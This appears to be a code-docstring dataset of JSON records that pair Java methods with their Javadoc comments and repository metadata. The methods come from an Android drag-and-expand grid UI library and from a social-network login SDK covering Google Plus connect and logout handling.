{"docstring": "/**\n *\n * \u65b9\u6cd5: animateExpanding <p>\n * \u63cf\u8ff0: \u52a8\u753b\u5c55\u5f00 <p>\n * \u53c2\u6570: @param view <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53487:04:22\n */\n", "func_signal": "public void animateExpanding(final View view)", "code": "{\n\tview.setVisibility(View.VISIBLE);\n\tfinal int widthSpec = View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED);\n\tfinal int heightSpec = View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED);\n\tview.measure(widthSpec, heightSpec);\n\tValueAnimator animator = createHeightAnimator(view, 0, view.getMeasuredHeight());\n\tanimator.start();\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomAboveView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: setHideItem <p>\n * \u63cf\u8ff0:  \u62d6\u52a8\u7684\u65f6\u5019\u4f1a\u9690\u85cf\u67d0\u4e2a <p>\n * \u53c2\u6570: @param hidePosition <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53485:03:05\n */\n", "func_signal": "public void setHideItem(int hidePosition)", "code": "{\n\tthis.mHidePosition = hidePosition;\n\tnotifyDataSetChanged();\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\other\\DragGridAdapter.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n * \u4ea4\u6362item,\u5e76\u4e14\u63a7\u5236item\u4e4b\u95f4\u7684\u663e\u793a\u4e0e\u9690\u85cf\u6548\u679c\n *\n * @param moveX\n * @param moveY\n */\n", "func_signal": "private void onSwapItem(int moveX, int moveY)", "code": "{\n\t// \u83b7\u53d6\u6211\u4eec\u624b\u6307\u79fb\u52a8\u5230\u7684\u90a3\u4e2aitem\u7684position\n\tfinal int tempPosition = pointToPosition(moveX, moveY);\n\n\t// \u5047\u5982tempPosition \u6539\u53d8\u4e86\u5e76\u4e14tempPosition\u4e0d\u7b49\u4e8e-1,\u5219\u8fdb\u884c\u4ea4\u6362\n\tif (tempPosition != mDragPosition && tempPosition != AdapterView.INVALID_POSITION && mAnimationEnd) {\n\t\tif (tempPosition != mIconInfoList.size() - 1) {\n\t\t\tmDragAdapter.reorderItems(mDragPosition, tempPosition);\n\t\t\tmDragAdapter.setHideItem(tempPosition);\n\n\t\t\tfinal ViewTreeObserver observer = getViewTreeObserver();\n\t\t\tobserver.addOnPreDrawListener(new OnPreDrawListener() {\n\n\t\t\t\t@Override\n\t\t\t\tpublic boolean onPreDraw() {\n\t\t\t\t\tobserver.removeOnPreDrawListener(this);\n\t\t\t\t\tanimateReorder(mDragPosition, tempPosition);\n\t\t\t\t\tmDragPosition = tempPosition;\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t});\n\t\t}\n\t}\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: closeExpandView <p>\n * \u63cf\u8ff0: \u6536\u7f29 <p>\n * \u53c2\u6570:  <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53487:03:49\n */\n", "func_signal": "public void closeExpandView()", "code": "{\n\tboolean isVisible = mContentParent.getVisibility() == View.VISIBLE;\n\tif (isVisible) {\n\t\tanimateCollapsing(mContentParent);\n\t}\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomAboveView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: refreshIconInfoList <p>\n * \u63cf\u8ff0: TODO <p>\n * \u53c2\u6570: @param iconInfoList <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53486:46:22\n */\n", "func_signal": "public void refreshIconInfoList(ArrayList<DragIconInfo> iconInfoList)", "code": "{\n\tmIconInfoList.clear();\n\tmIconInfoList.addAll(iconInfoList);\n\trefreshViewUI();\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomAboveView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: onDragItem <p>\n * \u63cf\u8ff0:  \u62d6\u52a8item\uff0c\u5728\u91cc\u9762\u5b9e\u73b0\u4e86item\u955c\u50cf\u7684\u4f4d\u7f6e\u66f4\u65b0\uff0citem\u7684\u76f8\u4e92\u4ea4\u6362\u4ee5\u53caGridView\u7684\u81ea\u884c\u6eda\u52a8 <p>\n * \u53c2\u6570: @param moveX\n * \u53c2\u6570: @param moveY <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53484:20:08\n */\n", "func_signal": "private void onDragItem(int moveX, int moveY)", "code": "{\n\tmWindowLayoutParams.x = moveX - mPoint2ItemLeft + mOffset2Left;\n\tmWindowLayoutParams.y = moveY - mPoint2ItemTop + mOffset2Top - mStatusHeight;\n\tmWindowManager.updateViewLayout(mDragImageView, mWindowLayoutParams); // \u66f4\u65b0\u955c\u50cf\u7684\u4f4d\u7f6e\n\tonSwapItem(moveX, moveY);\n\n\t// GridView\u81ea\u52a8\u6eda\u52a8\n\tmHandler.post(mScrollRunnable);\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: setViewCollaps <p>\n * \u63cf\u8ff0: TODO <p>\n * \u53c2\u6570:  <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53487:03:23\n */\n", "func_signal": "public void setViewCollaps()", "code": "{\n\tif (mItemViewClickListener != null) {\n\t\tmItemViewClickListener.closeExpandView();\n\t}\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomAboveView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: refreshViewUI <p>\n * \u63cf\u8ff0:  \u5237\u65b0UI<p>\n * \u53c2\u6570:  <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53487:02:17\n */\n", "func_signal": "private void refreshViewUI()", "code": "{\n\tremoveAllViews();\n\tint rowNum = mIconInfoList.size() / CustomGroup.COLUMNUM + (mIconInfoList.size() % CustomGroup.COLUMNUM > 0 ? 1 : 0);\n\tLinearLayout.LayoutParams rowParam = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);\n\tLinearLayout.LayoutParams verticalParams = new LinearLayout.LayoutParams(verticalViewWidth, LinearLayout.LayoutParams.FILL_PARENT);\n\tLinearLayout.LayoutParams horizontalParams = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.FILL_PARENT, verticalViewWidth);\n\tfor (int rowIndex = 0; rowIndex < rowNum; rowIndex++) {\n\t\tfinal View rowView = View.inflate(mContext, R.layout.gridview_above_rowview, null);\n\n\t\tLinearLayout llRowContainer = (LinearLayout) rowView.findViewById(R.id.gridview_rowcontainer_ll);\n\t\tfinal ImageView ivOpenFlag = (ImageView) rowView.findViewById(R.id.gridview_rowopenflag_iv);\n\t\tLinearLayout llBtm = (LinearLayout) rowView.findViewById(R.id.gridview_rowbtm_ll);\n\t\tfinal CustomGridView gridViewNoScroll = (CustomGridView) rowView.findViewById(R.id.gridview_child_gridview);\n\t\tif(mChildClickListener!=null){\n\t\t\tgridViewNoScroll.setChildClickListener(mChildClickListener);\n\t\t}\n\t\tgridViewNoScroll.setParentView(llBtm);\n\t\tLinearLayout.LayoutParams itemParam = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);\n\t\titemParam.weight = 1.0f;\n\t\tItemViewClickListener itemClickLitener = new ItemViewClickListener(llBtm, ivOpenFlag, new ItemViewClickInterface() {\n\n\t\t\t@Override\n\t\t\tpublic boolean shoudInteruptViewAnimtion(ItemViewClickListener listener, int position) {\n\t\t\t\tboolean isInterupt = false;\n\t\t\t\tmCustomGroup.clearEditDragView();\n\t\t\t\tif (mItemViewClickListener != null && !mItemViewClickListener.equals(listener)) {\n\t\t\t\t\tmItemViewClickListener.closeExpandView();\n\t\t\t\t}\n\t\t\t\tmItemViewClickListener = listener;\n\t\t\t\tDragIconInfo iconInfo = mIconInfoList.get(position);\n\t\t\t\tArrayList<DargChildInfo> childList = iconInfo.getChildList();\n\t\t\t\tif (childList.size() > 0) {\n\t\t\t\t\tgridViewNoScroll.refreshDataSet(childList);\n\t\t\t\t} else {\n\t\t\t\t\tsetViewCollaps();\n\t\t\t\t\tisInterupt = true;\n\t\t\t\t\tif (gridViewClickListener != null) {\n\t\t\t\t\t\tgridViewClickListener.onSingleClicked(iconInfo);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn isInterupt;\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void viewUpdateData(int position) {\n\t\t\t\tgridViewNoScroll.notifyDataSetChange(true);\n\t\t\t}\n\t\t});\n\t\tfor (int columnIndex = 0; columnIndex < CustomGroup.COLUMNUM; columnIndex++) {\n\t\t\tView itemView = View.inflate(mContext, R.layout.gridview_above_itemview, null);\n\t\t\tImageView ivIcon = (ImageView) itemView.findViewById(R.id.icon_iv);\n\t\t\tTextView tvName = (TextView) itemView.findViewById(R.id.name_tv);\n\t\t\tint itemInfoIndex = rowIndex * CustomGroup.COLUMNUM + columnIndex;\n\t\t\tif (itemInfoIndex > mIconInfoList.size()-1) {\n\t\t\t\titemView.setVisibility(View.INVISIBLE);\n\t\t\t}else{\n\t\t\t\tfinal DragIconInfo iconInfo = mIconInfoList.get(itemInfoIndex);\n\t\t\t\tivIcon.setImageResource(iconInfo.getResIconId());\n\t\t\t\ttvName.setText(iconInfo.getName());\n\t\t\t\titemView.setId(itemInfoIndex);\n\t\t\t\titemView.setTag(itemInfoIndex);\n\n\t\t\t\titemView.setOnClickListener(itemClickLitener);\n\t\t\t\titemView.setOnLongClickListener(new OnLongClickListener() {\n\n\t\t\t\t\t@Override\n\t\t\t\t\tpublic boolean onLongClick(View v) {\n\t\t\t\t\t\tif(iconInfo.getId()!= MORE){\n\t\t\t\t\t\t\tint position = (Integer) v.getTag();\n\t\t\t\t\t\t\tmCustomGroup.setEditModel(true, position);\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn true;\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t}\n\n\t\t\tllRowContainer.addView(itemView, itemParam);\n\t\t\tView view = new View(mContext);\n\t\t\tview.setBackgroundResource(R.color.gap_line);\n\t\t\tllRowContainer.addView(view, verticalParams);\n\t\t}\n\t\tView view = new View(mContext);\n\t\tview.setBackgroundResource(R.color.gap_line);\n\t\taddView(view, horizontalParams);\n\t\taddView(rowView, rowParam);\n\t\tif (rowIndex == rowNum - 1) {\n\t\t\tView btmView = new View(mContext);\n\t\t\tbtmView.setBackgroundResource(R.color.gap_line);\n\t\t\taddView(btmView, horizontalParams);\n\t\t}\n\n\t}\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomAboveView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: removeDragImage <p>\n * \u63cf\u8ff0:  \u4ece\u754c\u9762\u4e0a\u9762\u79fb\u9664\u62d6\u52a8\u955c\u50cf <p>\n * \u53c2\u6570:  <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53484:19:52\n */\n", "func_signal": "private void removeDragImage()", "code": "{\n\tif (mDragImageView != null) {\n\t\tmWindowManager.removeView(mDragImageView);\n\t\tmDragImageView = null;\n\t}\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: moveAnim <p>\n * \u63cf\u8ff0: \u79fb\u52a8\u52a8\u753b <p>\n * \u53c2\u6570: @param v\n * \u53c2\u6570: @param startX\n * \u53c2\u6570: @param toX\n * \u53c2\u6570: @param startY\n * \u53c2\u6570: @param toY\n * \u53c2\u6570: @param during <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53487:03:40\n */\n", "func_signal": "private void moveAnim(View v, int startX, int toX, int startY, int toY, long during)", "code": "{\n\tTranslateAnimation anim = new TranslateAnimation(startX, toX, startY, toY);\n\tanim.setDuration(during);\n\tanim.setFillAfter(true);\n\tv.startAnimation(anim);\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomAboveView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: isValideEvent <p>\n * \u63cf\u8ff0: \u6807\u8bb0\u662f\u5426\u662f\u5728\u8fd9\u4e2aview\u91cc\u9762\u7684\u70b9\u51fb\u4e8b\u4ef6 \u9632\u6b62\u4e8b\u4ef6\u51b2\u7a81 <p>\n * \u53c2\u6570: @param ev\n * \u53c2\u6570: @param scrolly\n * \u53c2\u6570: @return <p>\n * \u8fd4\u56de: boolean <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53484:34:01\n */\n", "func_signal": "public boolean isValideEvent(MotionEvent ev, int scrolly)", "code": "{\n\tint left = ((View)(getParent().getParent())).getLeft();\n\tint top = ((View)(getParent().getParent())).getTop();\n\tint x_ = (int) ev.getX();\n\tint y_ = (int) ev.getY();\n\tint tempx = x_-left;\n\tint tempy = y_-top+scrolly;\n\tint position = pointToPosition(tempx,tempy);\n\tRect rect = new Rect();\n\tgetHitRect(rect);\n\tif (position == AdapterView.INVALID_POSITION) {\n\t\treturn false;\n\t}else{\n\t\treturn true;\n\t}\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: reorderItems <p>\n * \u63cf\u8ff0: TODO <p>\n * \u53c2\u6570: @param oldPosition\n * \u53c2\u6570: @param newPosition <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53485:02:53\n */\n", "func_signal": "public void reorderItems(int oldPosition, int newPosition)", "code": "{\n\tDragIconInfo temp = mIconInfoList.get(oldPosition);\n\tif (oldPosition < newPosition) {\n\t\tfor (int i = oldPosition; i < newPosition; i++) {\n\t\t\tCollections.swap(mIconInfoList, i, i + 1);\n\t\t}\n\t} else if (oldPosition > newPosition) {\n\t\tfor (int i = oldPosition; i > newPosition; i--) {\n\t\t\tCollections.swap(mIconInfoList, i, i - 1);\n\t\t}\n\t}\n\tmIconInfoList.set(newPosition, temp);\n\tmodifyPosition = newPosition;\n\thasModifyedOrder = true;\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\other\\DragGridAdapter.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: animateCollapsing <p>\n * \u63cf\u8ff0: \u6536\u7f29\u52a8\u753b <p>\n * \u53c2\u6570: @param view <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53487:04:01\n */\n", "func_signal": "public void animateCollapsing(final View view)", "code": "{\n\tint origHeight = view.getHeight();\n\n\tValueAnimator animator = createHeightAnimator(view, origHeight, 0);\n\tanimator.addListener(new AnimatorListenerAdapter() {\n\n\t\t@Override\n\t\tpublic void onAnimationEnd(Animator animator) {\n\t\t\tview.setVisibility(View.GONE);\n\t\t\tmViewFlag.clearAnimation();\n\t\t\tmViewFlag.setVisibility(View.GONE);\n\t\t}\n\t});\n\tanimator.start();\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomAboveView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: refreshIconInfoList <p>\n * \u63cf\u8ff0: TODO <p>\n * \u53c2\u6570: @param iconInfoList <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53487:00:14\n */\n", "func_signal": "public void refreshIconInfoList(ArrayList<DragIconInfo> iconInfoList)", "code": "{\n\tmIconInfoList.clear();\n\tmIconInfoList.addAll(iconInfoList);\n\tmDragAdapter = new DragGridAdapter(mContext, mIconInfoList, this);\n\tthis.setAdapter(mDragAdapter);\n\tmDragAdapter.notifyDataSetChanged();\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: deletInfo <p>\n * \u63cf\u8ff0: \u5220\u9664 <p>\n * \u53c2\u6570: @param position\n * \u53c2\u6570: @param iconInfo <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53486:56:47\n */\n", "func_signal": "public void deletInfo(int position, DragIconInfo iconInfo)", "code": "{\n\tdeletAnimation(position);\n\tmCustomGroup.deletHomePageInfo(iconInfo);\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: onStopDrag <p>\n * \u63cf\u8ff0: \u505c\u6b62\u62d6\u62fd\u6211\u4eec\u5c06\u4e4b\u524d\u9690\u85cf\u7684item\u663e\u793a\u51fa\u6765\uff0c\u5e76\u5c06\u955c\u50cf\u79fb\u9664 <p>\n * \u53c2\u6570: @param dropx\n * \u53c2\u6570: @param dropy <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53484:20:35\n */\n", "func_signal": "private void onStopDrag(int dropx, int dropy)", "code": "{\n\n\tView view = getChildAt(mDragPosition - getFirstVisiblePosition());\n\n\tif (view != null) {\n\t\tview.setVisibility(View.VISIBLE);\n\t}\n\tmDragAdapter.setHideItem(-1);\n\tremoveDragImage();\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: createTranslationAnim <p>\n * \u63cf\u8ff0: TODO <p>\n * \u53c2\u6570: @param position\n * \u53c2\u6570: @param aimPosit\n * \u53c2\u6570: @param view\n * \u53c2\u6570: @param animView\n * \u53c2\u6570: @return <p>\n * \u8fd4\u56de: AnimatorSet <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53484:49:23\n */\n", "func_signal": "private AnimatorSet createTranslationAnim(int position, int aimPosit, View view, ImageView animView)", "code": "{\n\tint startx = view.getLeft();\n\tint starty = view.getTop();\n\tView aimView = getChildAt(aimPosit);\n\tint endx = aimView.getLeft();\n\tint endy = aimView.getTop();\n\n\tObjectAnimator animX = ObjectAnimator.ofFloat(animView, \"translationX\", startx, endx);\n\tObjectAnimator animY = ObjectAnimator.ofFloat(animView, \"translationY\", starty, endy);\n\tObjectAnimator scaleX = ObjectAnimator.ofFloat(animView, \"scaleX\", 1f, 0.5f);\n\tObjectAnimator scaleY = ObjectAnimator.ofFloat(animView, \"scaleY\", 1f, 0.5f);\n\tObjectAnimator alpaAnim = ObjectAnimator.ofFloat(animView, \"alpha\", 1f, 0.0f);\n\n\tAnimatorSet animSetXY = new AnimatorSet();\n\tanimSetXY.playTogether(animX, animY, scaleX, scaleY, alpaAnim);\n\treturn animSetXY;\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: notifyDataSetChange <p>\n * \u63cf\u8ff0: \u5237\u65b0\u6570\u636e <p>\n * \u53c2\u6570: @param iconInfoList <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53487:00:42\n */\n", "func_signal": "public void notifyDataSetChange(ArrayList<DragIconInfo> iconInfoList)", "code": "{\n\tmIconInfoList.clear();\n\tmIconInfoList.addAll(iconInfoList);\n\tmDragAdapter.resetModifyPosition();\n\tmDragAdapter.notifyDataSetChanged();\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: createHeightAnimator <p>\n * \u63cf\u8ff0: TODO <p>\n * \u53c2\u6570: @param view\n * \u53c2\u6570: @param start\n * \u53c2\u6570: @param end\n * \u53c2\u6570: @return <p>\n * \u8fd4\u56de: ValueAnimator <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53487:04:29\n */\n", "func_signal": "public ValueAnimator createHeightAnimator(final View view, int start, int end)", "code": "{\n\tValueAnimator animator = ValueAnimator.ofInt(start, end);\n\tanimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n\n\t\t@Override\n\t\tpublic void onAnimationUpdate(ValueAnimator valueAnimator) {\n\t\t\tint value = (Integer) valueAnimator.getAnimatedValue();\n\n\t\t\tViewGroup.LayoutParams layoutParams = view.getLayoutParams();\n\t\t\tlayoutParams.height = value;\n\t\t\tview.setLayoutParams(layoutParams);\n\t\t}\n\t});\n\treturn animator;\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomAboveView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n *\n * \u65b9\u6cd5: cancleEditModel <p>\n * \u63cf\u8ff0: \u662f\u5426\u4fee\u6539\u4e86<p>\n * \u53c2\u6570:  <p>\n * \u8fd4\u56de: void <p>\n * \u5f02\u5e38  <p>\n * \u4f5c\u8005: wedcel wedcel@gmail.com <p>\n * \u65f6\u95f4: 2015\u5e748\u670825\u65e5 \u4e0b\u53484:19:25\n */\n", "func_signal": "public void cancleEditModel()", "code": "{\n\tremoveDragImage();\n\tmCustomGroup.setEditModel(false, 0);\n}", "path": "app\\src\\main\\java\\com\\wedcel\\dragexpandgrid\\view\\CustomBehindView.java", "repo_name": "wedcel/DragExpandGrid", "stars": 677, "license": "None", "language": "java", "size": 2063}
{"docstring": "/**\n * @param fragment ant not activity or context, as we will need to call startActivityForResult,\n *                 we will want to receice on onActivityResult in out SocialNetworkManager\n *                 fragment\n */\n", "func_signal": "protected SocialNetwork(Fragment fragment)", "code": "{\n    mSocialNetworkManager = fragment;\n    mSharedPreferences = mSocialNetworkManager.getActivity().getSharedPreferences(SHARED_PREFERENCES_NAME, Context.MODE_PRIVATE);\n}", "path": "ASNECore\\src\\main\\java\\com\\github\\gorbin\\asne\\core\\SocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * After calling connect(), this method will be invoked asynchronously when the connect request has successfully completed.\n * @param bundle Bundle of data provided to clients by Google Play services. May be null if no content is provided by the service.\n */\n", "func_signal": "@Override\npublic void onConnected(Bundle bundle)", "code": "{\n    if (mConnectRequested) {\n        if (mLocalListeners.get(REQUEST_LOGIN) != null) {\n            mSharedPreferences.edit().putBoolean(SAVE_STATE_KEY_IS_CONNECTED, true).commit();\n            ((OnLoginCompleteListener) mLocalListeners.get(REQUEST_LOGIN)).onLoginSuccess(getID());\n            return;\n        }\n        if (mLocalListeners.get(REQUEST_LOGIN) != null) {\n            mLocalListeners.get(REQUEST_LOGIN).onError(getID(), REQUEST_LOGIN,\n                    \"get person == null\", null);\n        }\n    }\n    mConnectRequested = false;\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Logout from Google plus social network\n */\n", "func_signal": "@Override\npublic void logout()", "code": "{\n    mConnectRequested = false;\n\n    if (googleApiClient.isConnected()) {\n        mSharedPreferences.edit().remove(SAVE_STATE_KEY_IS_CONNECTED).commit();\n        Plus.AccountApi.clearDefaultAccount(googleApiClient);\n        googleApiClient.disconnect();\n        googleApiClient.connect();\n    }\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * Called when there was an error connecting the client to the service.\n * @param connectionResult A ConnectionResult that can be used for resolving the error, and deciding what sort of error occurred.\n */\n", "func_signal": "@Override\npublic void onConnectionFailed(ConnectionResult connectionResult)", "code": "{\n    mConnectionResult = connectionResult;\n    if (mConnectRequested && mLocalListeners.get(REQUEST_LOGIN) != null) {\n        mLocalListeners.get(REQUEST_LOGIN).onError(getID(), REQUEST_LOGIN,\n                \"error: \" + connectionResult.getErrorCode(), null);\n    }\n\n    mConnectRequested = false;\n}", "path": "googleplus\\src\\main\\java\\com\\github\\gorbin\\asne\\googleplus\\GooglePlusSocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
{"docstring": "/**\n * @param socialMediaManager the SocialMediaManager fragment.\n * @param context ant Activity or Application if not being called from a fragment\n */\n", "func_signal": "protected SocialNetwork(Fragment socialMediaManager, Context context)", "code": "{\n    //we keep the fragment in case it is needed in future. it also minimises the changes required.\n    mSocialNetworkManager = socialMediaManager;\n    mSharedPreferences = context.getSharedPreferences(SHARED_PREFERENCES_NAME, Context.MODE_PRIVATE);\n}", "path": "ASNECore\\src\\main\\java\\com\\github\\gorbin\\asne\\core\\SocialNetwork.java", "repo_name": "gorbin/ASNE", "stars": 883, "license": "None", "language": "java", "size": 4428}
